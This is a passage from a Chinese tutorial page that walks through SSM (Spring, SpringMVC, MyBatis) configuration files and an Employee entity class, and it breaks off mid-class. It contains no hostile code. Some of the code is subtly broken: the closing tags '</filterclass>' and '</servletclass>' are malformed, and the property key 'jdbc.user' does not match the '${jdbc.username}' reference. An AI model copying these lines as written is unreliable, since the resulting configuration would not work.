class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置处理请求方式PUT和DELETE的过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HiddenHttpMethodFilter&lt;/filterclass&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置SpringMVC的前端控制器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet&lt;/servletclass&gt;</span><br><span class="line">    <span class="comment">&lt;!-- 设置SpringMVC的配置文件的位置和名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:SpringMVC.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置Spring的配置文件的位置和名称 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:Spring.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置Spring的监听器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-4、创建SpringMVC的配置文件并配置"><a href="#4-4、创建SpringMVC的配置文件并配置" class="headerlink" title="4.4、创建SpringMVC的配置文件并配置"></a>4.4、创建SpringMVC的配置文件并配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--扫描组件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu.ssm.controller&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置视图解析器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring5.view.ThymeleafViewResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;order&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateEngine&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring5.SpringTemplateEngine&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateResolver&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span></span></span><br><span class="line"><span class="tag">                      <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver&quot;</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 视图前缀 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/templates/&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 视图后缀 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.html&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HTML5&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置访问首页的视图控制 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">view-name</span>=<span class="string">&quot;index&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:view-controller</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置默认的servlet处理静态资源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 开启MVC的注解驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-5、搭建MyBatis环境"><a href="#4-5、搭建MyBatis环境" class="headerlink" title="4.5、搭建MyBatis环境"></a>4.5、搭建MyBatis环境</h2><h3 id="①创建属性文件jdbc-properties"><a href="#①创建属性文件jdbc-properties" class="headerlink" title="①创建属性文件jdbc.properties"></a>①创建属性文件jdbc.properties</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdbc.user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">atguigu</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC</span></span><br><span class="line"><span class="attr">jdbc.driver</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h3 id="②创建MyBatis的核心配置文件mybatis-config-xml"><a href="#②创建MyBatis的核心配置文件mybatis-config-xml" class="headerlink" title="②创建MyBatis的核心配置文件mybatis-config.xml"></a>②创建MyBatis的核心配置文件mybatis-config.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta"><span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--将下划线映射为驼峰--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置分页插件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="③创建Mapper接口和映射文件"><a href="#③创建Mapper接口和映射文件" class="headerlink" title="③创建Mapper接口和映射文件"></a>③创建Mapper接口和映射文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmployeeMapper</span> &#123;</span><br><span class="line">List&lt;Employee&gt; <span class="title function_">getEmployeeList</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta"><span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.atguigu.ssm.mapper.EmployeeMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmployeeList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Employee&quot;</span>&gt;</span></span><br><span class="line">        select * from t_emp</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="④创建日志文件log4j-xml"><a href="#④创建日志文件log4j-xml" class="headerlink" title="④创建日志文件log4j.xml"></a>④创建日志文件log4j.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">log4j</span>:configuration <span class="keyword">SYSTEM</span> <span class="string">&quot;log4j.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">log4j:configuration</span> <span class="attr">xmlns:log4j</span>=<span class="string">&quot;http://jakarta.apache.org/log4j/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.log4j.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Encoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.log4j.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;ConversionPattern&quot;</span> <span class="attr">value</span>=<span class="string">&quot;%-5p %d&#123;MM-dd HH:mm:ss,SSS&#125; %m (%F:%L) \n&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;java.sql&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">&quot;debug&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;org.apache.ibatis&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">&quot;info&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">&quot;debug&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">log4j:configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-6、创建Spring的配置文件并配置"><a href="#4-6、创建Spring的配置文件并配置" class="headerlink" title="4.6、创建Spring的配置文件并配置"></a>4.6、创建Spring的配置文件并配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">                           http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                           http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">                           https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--扫描组件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu.ssm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span><span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入jdbc.properties --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:property-placeholder</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置Druid数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置用于创建SqlSessionFactory的工厂bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置MyBatis配置文件的路径（可以不设置） --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:mybatis-config.xml&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置数据源 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置类型别名所对应的包 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;typeAliasesPackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.atguigu.ssm.pojo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            设置映射文件的路径</span></span><br><span class="line"><span class="comment">            若映射文件所在路径和mapper接口所在路径一致，则不需要设置</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/*.xml&quot;&gt;</span></span><br><span class="line"><span class="comment">            &lt;/property&gt;</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        配置mapper接口的扫描配置</span></span><br><span class="line"><span class="comment">        由mybatis-spring提供，可以将指定包下所有的mapper接口创建动态代理</span></span><br><span class="line"><span class="comment">        并将这些动态代理作为IOC容器的bean管理</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.atguigu.ssm.mapper&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-7、测试功能"><a href="#4-7、测试功能" class="headerlink" title="4.7、测试功能"></a>4.7、测试功能</h2><h3 id="①创建组件"><a href="#①创建组件" class="headerlink" title="①创建组件"></a>①创建组件</h3><p>实体类Employee</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer empId;</span><br><span class="line">    <span class="keyword">private</span> String empName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(Integer empId, String empName, Integer age, String sex,</span></span><br><span class="line"><span class="params">                    String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.empId = empId;</span><br><span class="line">        <span class="built_in">this</span>.empName = empName;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getEmpId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> empId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmpId</span><span class="params">(Integer empId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.empId = empId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmpName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> empName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmpName</span><span class="params">(String empName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.empName = empName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    